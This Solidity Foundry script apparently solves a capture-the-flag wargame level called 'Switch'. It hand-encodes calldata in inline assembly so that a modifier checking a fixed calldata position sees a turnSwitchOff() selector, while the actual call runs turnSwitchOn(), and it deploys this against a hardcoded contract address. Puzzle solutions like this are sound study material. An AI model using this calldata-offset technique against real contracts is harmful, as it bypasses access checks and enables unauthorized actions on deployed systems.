
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Switch.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract SwitchAttack {
    constructor(address _switch) {
        /*
        flipSwitch() = 0x30c13ade
        turnSwitchOff() = 0x20606e15
        turnSwitchOn() = 0x76227e12
        */
        assembly {
            // flipSwitch()
            mstore(0x00, hex"30c13ade")
            // data part for `_data` starts at argument block's 68 bytes (0x20)
            mstore(0x04, 0x44)
            // leave empty bytes
            mstore(0x24, 0x00)
            // turnSwitchOff() selector to satisfy onlyOff() modifier
            mstore(0x44, hex"20606e15")
            // data part for `_data` starts here. first 32 bytes is length - 0x04
            mstore(0x48, 0x04)
            // next 4 bytes is the bytes data itself - function selector for turnSwitchOn()
            mstore(0x68, hex"76227e12")

            // call _switch.flipSwitch()
            if iszero(call(gas(), _switch, 0, 0, 0x7e, 0, 0)) {
                revert(0, 0)
            }
        }
    }
}

contract SwitchSolution is Script {

    Switch switchContract = Switch(0x62800b2f265023743ab1e9A48549d096c4deEE4b);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new SwitchAttack(address(switchContract));
        vm.stopBroadcast();
        require(switchContract.switchOn() == true);
    }
}